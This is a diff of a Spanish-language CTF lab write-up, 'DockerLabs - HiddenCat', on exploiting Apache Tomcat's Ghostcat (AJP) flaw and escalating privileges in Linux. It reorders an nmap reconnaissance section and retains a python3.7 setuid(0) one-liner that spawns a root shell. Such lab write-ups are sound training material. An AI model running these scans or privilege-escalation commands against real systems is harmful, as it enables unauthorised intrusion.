@@ -1,9 +1,7 @@
 ---
 title: "DockerLabs - HiddenCat"
-difficulty: ""
+difficulty: "Fácil"
 source: "DockerLabs"
-status: "WIP"
-date: "2026-07-21"
 ---
 
 Laboratorio para practicar la explotación de Apache Tomcat (Ghostcat) y escalada de privilegios en Linux.
@@ -13,6 +11,17 @@ Laboratorio para practicar la explotación de Apache Tomcat (Ghostcat) y escalad
 ```bash
 bash auto_deploy.sh hiddencat.tar
 ```
+
+## Reconocimiento
+
+```bash
+nmap -sCV -p- 172.17.0.2
+```
+
+**Resultados:**
+- `22/tcp` — SSH
+- `8009/tcp` — AJP (Apache JServ Protocol)
+- `8080/tcp` — Apache Tomcat 9
 
 ## Explotación
 
@@ -66,17 +75,3 @@ python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
 **Root conseguido.** ✓
-
----
-
-## Reconocimiento
-
-```bash
-nmap -sCV -p- 172.17.0.2
-```
-
-**Resultados:**
-- `22/tcp` — SSH
-- `8009/tcp` — AJP (Apache JServ Protocol)
-- `8080/tcp` — Apache Tomcat 9
-
